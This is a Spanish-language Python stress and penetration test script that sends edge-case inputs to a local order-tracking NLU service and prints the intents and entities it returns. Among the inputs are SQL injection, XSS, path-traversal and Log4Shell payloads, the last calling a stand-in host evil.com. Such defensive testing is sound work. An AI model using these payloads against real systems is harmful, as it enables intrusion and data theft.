"""
💥 ORION NLU - STRESS TEST & PENETRATION SUITE
===============================================
"El Rompedor" - Herramienta de demolición para sistemas NLU

Este script está diseñado para ROMPER el sistema NLU mediante:
- Casos extremos de longitud y complejidad
- Ataques de caracteres especiales y encoding
- Ambigüedad semántica intencional
- Inundación de entidades (entity flooding)
- Formatos caóticos y corruptos

Objetivo: Encontrar los límites, vulnerabilidades y puntos de quiebre del NLU.
"""

import asyncio
import httpx
from datetime import datetime
from typing import Dict, List
import json


# ============================================
# CONFIGURACIÓN
# ============================================

NLU_URL = "http://localhost:8001/process"

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


# ============================================
# ARSENAL DE PRUEBAS DESTRUCTIVAS
# ============================================

STRESS_TEST_CASES = {
    "CARGA_Y_LONGITUD": [
        {
            "text": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem. Donde esta mi pedido 12345?",
            "description": "Mensaje ultra largo (párrafo completo con pregunta al final)"
        },
        {
            "text": "si",
            "description": "Mensaje de una sola palabra ambigua"
        },
        {
            "text": "ok",
            "description": "Palabra ultra corta sin contexto"
        },
        {
            "text": "pero",
            "description": "Conector sin contenido"
        },
        {
            "text": "a",
            "description": "Un solo carácter"
        },
        {
            "text": "no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé no sé",
            "description": "Repetición extrema de la misma frase"
        },
        {
            "text": "pedidopedidopedidopedidopedidopedidopedidopedidopedidopedidopedidopedidopedidopedidopedidopedido",
            "description": "Palabra repetida sin espacios (palabra monstruo)"
        },
    ],
    
    "CARACTERES_ESPECIALES": [
        {
            "text": "🚀📦💸🎉🔥💀👻🤖🏆⚠️🚨📱💻🌟✨🎯🎪🎭🎬🎮🎲🎰🃏🀄🎴🎱🏀⚽🏈🏐🏉🎾🎳⛳🏹🎣",
            "description": "Solo emojis sin texto"
        },
        {
            "text": "Hola 🚀 quiero saber 📦 donde está mi pedido 💸 número 12345 🎉",
            "description": "Mensaje normal con emojis intercalados"
        },
        {
            "text": "Привет, где мой заказ 12345? Спасибо!",
            "description": "Texto en ruso (cirílico)"
        },
        {
            "text": "こんにちは、私の注文12345はどこですか？",
            "description": "Texto en japonés (kanji/hiragana)"
        },
        {
            "text": "你好，我的订单12345在哪里？",
            "description": "Texto en chino (mandarín)"
        },
        {
            "text": "SELECT * FROM pedidos WHERE id = 12345; DROP TABLE users; --",
            "description": "Intento de SQL injection"
        },
        {
            "text": "<script>alert('XSS')</script> donde esta mi pedido 12345",
            "description": "Intento de XSS attack"
        },
        {
            "text": "'; OR '1'='1'; -- pedido 12345",
            "description": "SQL injection clásico"
        },
        {
            "text": "../../../etc/passwd pedido 12345",
            "description": "Path traversal attempt"
        },
        {
            "text": "${jndi:ldap://evil.com/a} pedido 12345",
            "description": "Log4Shell injection attempt"
        },
        {
            "text": "!@#$%^&*()_+-=[]{}|;':\",./<>?`~",
            "description": "Todos los símbolos especiales del teclado"
        },
    ],
    
    "AMBIGUEDAD_SEMANTICA": [
        {
            "text": "Hola, quiero saber dónde está mi pedido que nunca llega porque su servicio es una poronga, gracias, chau, por cierto, ¿tienen stock?",
            "description": "Mezcla caótica: saludo + tracking + queja + agradecimiento + despedida + consulta stock"
        },
        {
            "text": "Quiero cancelar mi pedido pero también quiero saber cuánto cuesta y si tienen stock disponible, ¿dónde está mi envío? gracias",
            "description": "5 intenciones conflictivas en una frase"
        },
        {
            "text": "No quiero no cancelar mi pedido que no quiero que no llegue",
            "description": "Dobles y triples negaciones confusas"
        },
        {
            "text": "¿Tienen stock? No, espera, quiero cancelar. Bueno, en realidad quiero saber el precio primero. Olvídalo, mejor rastreá mi pedido 12345. Chau, gracias.",
            "description": "Usuario indeciso cambiando de opinión constantemente"
        },
        {
            "text": "Mi pedido es el pedido del pedido que pedí cuando pedí el pedido anterior",
            "description": "Recursión semántica sin sentido"
        },
        {
            "text": "Quiero no quiero pero si quiero aunque no quiero entonces quiero",
            "description": "Contradicciones lógicas encadenadas"
        },
        {
            "text": "Hola chau hola chau hola chau hola chau",
            "description": "Saludo y despedida alternados"
        },
        {
            "text": "¿El precio del stock del pedido del envío de la orden del producto?",
            "description": "Cadena de genitivos sin sujeto claro"
        },
    ],
    
    "ENTITY_FLOODING": [
        {
            "text": "Necesito el pedido 12345 y el TRK-555, no el 999 que me dijeron que costaba $5000, sino el que sale para la orden 888-ABC con tracking ID-999-ZZZ",
            "description": "Múltiples IDs y números conflictivos"
        },
        {
            "text": "Pedido 111 222 333 444 555 666 777 888 999 000 123 456 789",
            "description": "Inundación de números secuenciales"
        },
        {
            "text": "TRK-001 TRK-002 TRK-003 TRK-004 TRK-005 TRK-006 TRK-007 TRK-008 TRK-009 TRK-010",
            "description": "Múltiples tracking IDs válidos"
        },
        {
            "text": "Cuesta $100 o $200 o $300 o $400 o $500 o $600 o $700 o $800 o $900 o $1000?",
            "description": "Inundación de precios"
        },
        {
            "text": "Producto ABC-123 XYZ-789 QWE-456 RTY-321 UIO-654 PAS-987",
            "description": "Múltiples códigos de producto alfanuméricos"
        },
        {
            "text": "Mi pedido 12345 12345 12345 12345 12345 12345 12345 12345",
            "description": "Mismo número repetido múltiples veces"
        },
        {
            "text": "Pedido AAAAAAAAAA-1111111111-BBBBBBBBBB-2222222222-CCCCCCCCCC-3333333333",
            "description": "ID monstruosamente largo"
        },
    ],
    
    "FORMATO_CAOTICO": [
        {
            "text": "donde\n\n\n\n\nesta\n\n\n\nmi\n\n\npedido\n\n\n12345",
            "description": "Saltos de línea excesivos entre palabras"
        },
        {
            "text": "donde     esta          mi               pedido                    12345",
            "description": "Espacios múltiples aleatorios"
        },
        {
            "text": "\t\t\tdonde\testa\t\tmi\t\t\tpedido\t12345\t\t",
            "description": "Tabs en lugar de espacios"
        },
        {
            "text": "   \n\n\t  \n   donde esta mi pedido 12345   \n\n\t  \n   ",
            "description": "Mezcla de espacios, tabs y newlines al inicio y final"
        },
        {
            "text": "DoNdE eStA mI pEdIdO 12345?",
            "description": "CaMeLcAsE aleatorio"
        },
        {
            "text": "DONDE ESTA MI PEDIDO 12345?????????????????????",
            "description": "Todo en mayúsculas con puntuación excesiva"
        },
        {
            "text": "donde...esta...mi...pedido...12345...",
            "description": "Puntos suspensivos como separadores"
        },
        {
            "text": "¿¿¿¿¿DONDE ESTA MI PEDIDO 12345?????",
            "description": "Signos de interrogación duplicados al inicio y fin"
        },
        {
            "text": "d o n d e   e s t a   m i   p e d i d o   1 2 3 4 5",
            "description": "Espacios entre cada letra"
        },
    ],
    
    "EDGE_CASES_EXTREMOS": [
        {
            "text": "",
            "description": "String completamente vacío"
        },
        {
            "text": "     ",
            "description": "Solo espacios en blanco"
        },
        {
            "text": "\n\n\n",
            "description": "Solo saltos de línea"
        },
        {
            "text": "\t\t\t",
            "description": "Solo tabs"
        },
        {
            "text": "null",
            "description": "La palabra 'null'"
        },
        {
            "text": "undefined",
            "description": "La palabra 'undefined'"
        },
        {
            "text": "NaN",
            "description": "Not a Number como texto"
        },
        {
            "text": "true false true false",
            "description": "Booleanos como texto"
        },
        {
            "text": "0",
            "description": "Solo el número cero"
        },
        {
            "text": "-1",
            "description": "Número negativo"
        },
        {
            "text": "999999999999999999999999999999999999999999999999999999999999",
            "description": "Número absurdamente grande"
        },
        {
            "text": "Infinity",
            "description": "La palabra 'Infinity'"
        },
    ],
    
    "UNICODE_HELL": [
        {
            "text": "👨‍👩‍👧‍👦👨‍👩‍👧‍👦👨‍👩‍👧‍👦 pedido 12345",
            "description": "Emojis compuestos (zero-width joiners)"
        },
        {
            "text": "Te̷̢͎̰̖̹̗̤͉̖̪̬̘͌̿́̾̈́̒̊͒̾͌̕͜͝x̷̨̢̛̬̰̯̩̬̙̼̫͕̱͇̊̓̀̽̓̎͘͠t̷̰̟̩͍̻̬͎̦̗̦͍̰͇͖̂̅̒͒͊̃̌̒ǫ̷̛̘̲̦͙̳̭̦͔̲̳͇̟̮̒̇͂̓͑͋̿̀̕͝ ̴̨̡̺͚̰̭͙̩̻̭̔̏̓̆̋̊̓̑͠͝z̸̢̧̯͓̠̮̺͔̪̲͙̾̒̇̏̿̓͂̆̔͝͝ą̸̳̰̱͖͓̫̟̝̆̓̽̒̈́̿͐̏͋̆͘͜͠ĺ̸̨̧̻̼̮̦̯͎̬̳͕̿̒͐̒̃̀̓̕͝g̸̡̨̛̫̲͍̝̞͖̜̦̏̔̇͗̀̃̔̀͜ͅǫ̵̧̲̹̫̘̗̖̟̤̻̖̙͖̔͐̈́̊͛̕͝",
            "description": "Texto Zalgo (combining diacritical marks)"
        },
        {
            "text": "‮12345 odidep im atse ednod",
            "description": "Right-to-left override (texto invertido)"
        },
        {
            "text": "​​​​​donde esta mi pedido 12345",
            "description": "Zero-width spaces invisibles al inicio"
        },
        {
            "text": "donde\u200Besta\u200Bmi\u200Bpedido\u200B12345",
            "description": "Zero-width spaces entre palabras"
        },
    ],
}


# ============================================
# FUNCIONES DE ATAQUE
# ============================================

async def stress_test_nlu(text: str, user_id: str) -> Dict:
    """
    Envía un caso de prueba destructivo al NLU y captura la respuesta.
    """
    async with httpx.AsyncClient(timeout=30.0) as client:
        try:
            response = await client.post(
                NLU_URL,
                json={
                    "text": text,
                    "channel_user_id": user_id
                }
            )
            response.raise_for_status()
            return {
                "status": "success",
                "status_code": response.status_code,
                "data": response.json()
            }
        except httpx.HTTPStatusError as e:
            return {
                "status": "http_error",
                "status_code": e.response.status_code,
                "error": str(e)
            }
        except Exception as e:
            return {
                "status": "exception",
                "error": str(e)
            }


def print_stress_result(category: str, test_case: Dict, result: Dict, test_num: int):
    """
    Imprime el resultado de un caso de prueba de estrés.
    """
    print(f"\n{Colors.BOLD}{Colors.CYAN}{'=' * 80}")
    print(f"🎯 TEST #{test_num} - [{category}]")
    print(f"{'=' * 80}{Colors.RESET}")
    
    print(f"\n{Colors.YELLOW}📝 INPUT:{Colors.RESET}")
    print(f"   Descripción: {test_case['description']}")
    
    # Mostrar el texto de forma segura (truncar si es muy largo)
    input_text = test_case['text']
    if len(input_text) > 200:
        print(f"   Texto: {repr(input_text[:200])}... (truncado, longitud: {len(input_text)})")
    else:
        print(f"   Texto: {repr(input_text)}")
    
    print(f"\n{Colors.MAGENTA}📊 RESULTADO:{Colors.RESET}")
    
    if result["status"] == "success":
        print(f"   {Colors.GREEN}✓ Status: HTTP {result['status_code']} (SUCCESS){Colors.RESET}")
        
        data = result["data"]
        intent = data.get("intent", "N/A")
        confidence = data.get("confidence", 0.0)
        entities = data.get("entities", [])
        
        # Colorear el intent según si es desconocido o conocido
        if intent == "intencion_desconocida":
            intent_color = Colors.YELLOW
        else:
            intent_color = Colors.GREEN
        
        print(f"   Intent: {intent_color}{intent}{Colors.RESET}")
        print(f"   Confidence: {confidence:.2f}")
        print(f"   Entidades extraídas: {len(entities)}")
        
        if entities:
            print(f"   {Colors.CYAN}Detalle de entidades:{Colors.RESET}")
            for entity in entities[:5]:  # Mostrar máximo 5
                print(f"      - {entity.get('label', 'N/A')}: {entity.get('value', 'N/A')}")
            if len(entities) > 5:
                print(f"      ... y {len(entities) - 5} más")
        
        # JSON completo (opcional, comentado para no saturar)
        # print(f"\n   {Colors.BLUE}JSON Completo:{Colors.RESET}")
        # print(f"   {json.dumps(data, indent=2, ensure_ascii=False)}")
        
    elif result["status"] == "http_error":
        print(f"   {Colors.RED}✗ HTTP ERROR {result['status_code']}{Colors.RESET}")
        print(f"   Error: {result['error']}")
    else:
        print(f"   {Colors.RED}✗ EXCEPTION{Colors.RESET}")
        print(f"   Error: {result['error']}")


async def run_stress_tests():
    """
    Ejecuta toda la suite de pruebas destructivas.
    """
    print(f"{Colors.BOLD}{Colors.RED}")
    print("=" * 80)
    print("💥 ORION NLU - STRESS TEST & PENETRATION SUITE")
    print("=" * 80)
    print(f"   \"El Rompedor\" - Herramienta de Demolición de Sistemas NLU")
    print("=" * 80)
    print(f"{Colors.RESET}\n")
    print(f"⏰ Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"🎯 Objetivo: ROMPER el sistema NLU mediante casos extremos y ataques\n")
    print(f"{Colors.YELLOW}⚠️  ADVERTENCIA: Esta suite está diseñada para estresar el sistema{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Algunos casos pueden generar errores inesperados{Colors.RESET}\n")
    
    total_tests = sum(len(cases) for cases in STRESS_TEST_CASES.values())
    test_counter = 0
    
    # Estadísticas
    stats = {
        "total": 0,
        "success": 0,
        "http_error": 0,
        "exception": 0,
        "unknown_intent": 0,
        "known_intent": 0,
    }
    
    for category, test_cases in STRESS_TEST_CASES.items():
        print(f"\n{Colors.BOLD}{Colors.BLUE}")
        print("=" * 80)
        print(f"📂 CATEGORÍA: {category}")
        print(f"   Total de tests: {len(test_cases)}")
        print("=" * 80)
        print(f"{Colors.RESET}")
        
        for test_case in test_cases:
            test_counter += 1
            user_id = f"stress_test_{test_counter}"
            
            # Ejecutar test
            result = await stress_test_nlu(test_case["text"], user_id)
            
            # Imprimir resultado
            print_stress_result(category, test_case, result, test_counter)
            
            # Actualizar estadísticas
            stats["total"] += 1
            stats[result["status"]] += 1
            
            if result["status"] == "success":
                intent = result["data"].get("intent", "")
                if intent == "intencion_desconocida":
                    stats["unknown_intent"] += 1
                else:
                    stats["known_intent"] += 1
            
            # Pausa breve para no saturar
            await asyncio.sleep(0.1)
    
    # Resumen final
    print(f"\n{Colors.BOLD}{Colors.RED}")
    print("=" * 80)
    print("📊 RESUMEN DE DEMOLICIÓN")
    print("=" * 80)
    print(f"{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}Resultados Generales:{Colors.RESET}")
    print(f"  Total de pruebas ejecutadas: {stats['total']}")
    print(f"  {Colors.GREEN}✓ Respuestas exitosas: {stats['success']}{Colors.RESET}")
    print(f"  {Colors.RED}✗ Errores HTTP: {stats['http_error']}{Colors.RESET}")
    print(f"  {Colors.RED}✗ Excepciones: {stats['exception']}{Colors.RESET}")
    
    if stats['success'] > 0:
        print(f"\n{Colors.BOLD}Análisis de Intents:{Colors.RESET}")
        print(f"  {Colors.YELLOW}Intención desconocida: {stats['unknown_intent']} ({stats['unknown_intent']/stats['success']*100:.1f}%){Colors.RESET}")
        print(f"  {Colors.GREEN}Intención conocida: {stats['known_intent']} ({stats['known_intent']/stats['success']*100:.1f}%){Colors.RESET}")
    
    # Veredicto final
    success_rate = (stats['success'] / stats['total'] * 100) if stats['total'] > 0 else 0
    
    print(f"\n{Colors.BOLD}{'=' * 80}")
    print(f"VEREDICTO FINAL")
    print(f"{'=' * 80}{Colors.RESET}")
    
    print(f"\n{Colors.CYAN}Tasa de respuesta exitosa: {success_rate:.1f}%{Colors.RESET}")
    
    if success_rate >= 90:
        print(f"\n{Colors.GREEN}✓ El sistema es ROBUSTO - Soportó el bombardeo con éxito{Colors.RESET}")
        print(f"{Colors.GREEN}  El NLU manejó la mayoría de casos extremos sin crashear{Colors.RESET}")
    elif success_rate >= 70:
        print(f"\n{Colors.YELLOW}⚠ El sistema es RESILIENTE pero tiene debilidades{Colors.RESET}")
        print(f"{Colors.YELLOW}  Algunos casos extremos generaron errores{Colors.RESET}")
    else:
        print(f"\n{Colors.RED}✗ El sistema es VULNERABLE - Múltiples puntos de quiebre{Colors.RESET}")
        print(f"{Colors.RED}  Se encontraron vulnerabilidades significativas{Colors.RESET}")
    
    unknown_rate = (stats['unknown_intent'] / stats['success'] * 100) if stats['success'] > 0 else 0
    
    if unknown_rate > 50:
        print(f"\n{Colors.YELLOW}⚠ ALTA TASA DE INTENCIONES DESCONOCIDAS ({unknown_rate:.1f}%){Colors.RESET}")
        print(f"{Colors.YELLOW}  El sistema se confunde fácilmente con casos extremos{Colors.RESET}")
    else:
        print(f"\n{Colors.GREEN}✓ Baja tasa de confusión ({unknown_rate:.1f}% desconocidas){Colors.RESET}")
        print(f"{Colors.GREEN}  El sistema intenta clasificar incluso casos extremos{Colors.RESET}")
    
    print(f"\n⏰ Fin: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"\n{Colors.MAGENTA}{'=' * 80}")
    print("💥 Demolición completada. Analiza los resultados cuidadosamente.")
    print(f"{'=' * 80}{Colors.RESET}\n")


# ============================================
# MAIN
# ============================================

if __name__ == "__main__":
    print(f"\n{Colors.RED}🔥 Iniciando Stress Test Suite...{Colors.RESET}\n")
    print(f"⚙️  Target: {NLU_URL}")
    print(f"\n{Colors.YELLOW}⚠️  Este test está diseñado para ESTRESAR el sistema{Colors.RESET}")
    print(f"{Colors.YELLOW}⚠️  Puede generar logs de error - esto es INTENCIONAL{Colors.RESET}\n")
    
    input(f"{Colors.CYAN}Presiona ENTER para comenzar el bombardeo...{Colors.RESET} ")
    
    asyncio.run(run_stress_tests())
